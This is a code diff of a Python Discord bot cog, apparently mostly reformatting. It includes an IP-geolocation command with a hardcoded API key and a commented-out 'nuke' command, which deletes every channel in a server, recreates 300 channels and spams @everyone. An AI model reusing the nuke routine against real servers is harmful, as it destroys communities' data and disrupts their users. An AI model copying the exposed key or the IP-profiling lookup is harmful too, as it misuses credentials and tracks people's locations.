@@ -18,7 +18,7 @@ class special(commands.Cog):
     @commands.command(help='ip')
     async def ip(self, ctx, ip):
         def delete(ptr2):
-            ptr=1
+            ptr = 1
             try:
                 with open('test.txt', 'r') as fr:
                     # reading line by line
@@ -38,20 +38,23 @@ class special(commands.Cog):
 
             except:
                 print("Oops! something error")
+
         # 73.240.38.112
         fields = "country,city,security,region,postal_code,continent,longitude,latitude,security > is_vpn,timezone,currency ,connection"
         key = '981a6c79887c405f8f1509da9a080a5e'
-        response = requests.get('https://ipgeolocation.abstractapi.com/v1/?api_key=' + key + '&ip_address=' + ip) #+ "&fields=" + fields)
+        response = requests.get(
+            'https://ipgeolocation.abstractapi.com/v1/?api_key=' + key + '&ip_address=' + ip)  # + "&fields=" + fields)
         result = json.loads(response.content)
 
         with open('test.txt', mode='wb') as file:
             file.write(response.content)
 
-
-
-        f1 = open('test.txt','r+')
+        f1 = open('test.txt', 'r+')
         input = f1.read()
-        input = input.replace(',',"\n").replace("'","").replace("{","").replace("}","").replace("emoji:","").replace(" name:"," ").replace(" ","").replace(":",": ").replace('"','').replace("security: ","").replace("currency_name: ","")
+        input = input.replace(',', "\n").replace("'", "").replace("{", "").replace("}", "").replace("emoji:",
+                                                                                                    "").replace(
+            " name:", " ").replace(" ", "").replace(":", ": ").replace('"', '').replace("security: ", "").replace(
+            "currency_name: ", "")
         f2 = open("test.txt", "w+")
         f2.write(input)
         f1.close()
@@ -79,28 +82,27 @@ class special(commands.Cog):
             color=0x19B9B9)
         await ctx.send(embed=embed)
 
-    """
-    @commands.command(pass_context=True, help = 'heh')
+    """@commands.command(pass_context=True, help='heh')
     async def nuke(self, ctx, channelnukename="bruh"):
-      user = ctx.author.id
-      if ctx.guild.id == 603084195102851073:
-        await ctx.channel.send("fucked up")
-      else:
-        if user == 613995377758044190:#414931767129276428:
-            await ctx.message.delete()
-            guild = ctx.guild
-            count = 0
-            message = "https://cdn.discordapp.com/attachments/868557949721796608/945831875308576828/video0_13_online-video-cutter.com.gif"
-            for channel in guild.channels:
-                await channel.delete()
-            while count < 300:
-                await guild.create_text_channel(channelnukename)
-                channel = guild.channels[count]
-                await channel.send(message)
-                await channel.send("@everyone")
-                count += 1
+        user = ctx.author.id
+        if ctx.guild.id == 603084195102851073:
+            await ctx.channel.send("fucked up")
         else:
-            await ctx.send("Bruh")"""
+            if user == 414931767129276428:
+                await ctx.message.delete()
+                guild = ctx.guild
+                count = 0
+                message = "https://tenor.com/view/nae-nae-gif-18057748"
+                for channel in guild.channels:
+                    await channel.delete()
+                while count < 300:
+                    await guild.create_text_channel(channelnukename)
+                    channel = guild.channels[count]
+                    await channel.send(message)
+                    await channel.send("@everyone")
+                    count += 1
+            else:
+                await ctx.send("Bruh")"""
 
     @commands.command(pass_context=True, help='resets a server')
     async def reset(self, ctx):
